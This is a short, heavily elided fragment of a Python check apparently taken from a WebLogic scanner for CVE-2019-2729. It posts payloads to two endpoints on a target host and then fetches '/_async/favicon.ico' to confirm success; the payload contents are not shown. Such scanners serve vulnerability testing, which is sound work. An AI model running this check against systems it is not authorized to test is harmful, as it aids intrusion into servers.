...
def run(rip,rport):
    ...
    r1 = requests.post('http://' + str(rip) + ':' + str(rport) + path1, headers=headers, data=payload1, timeout=5)
    time.sleep(1)
    r2 = requests.post('http://' + str(rip) + ':' + str(rport) + path2, headers=headers, data=payload2, timeout=5)
    time.sleep(1)
    r3 = requests.get('http://' + str(rip) + ':' + str(rport) + '/_async/favicon.ico', timeout=5)
...
def verify(url):
    ...
    try:
        ...
        if run(host, port):
            ...
            relsult['url'] = url
            relsult['about'] = 'https://github.com/rabbitmask/WeblogicScan/blob/master/poc/CVE_2019_2729.py'
        return relsult
    except:
        return relsult
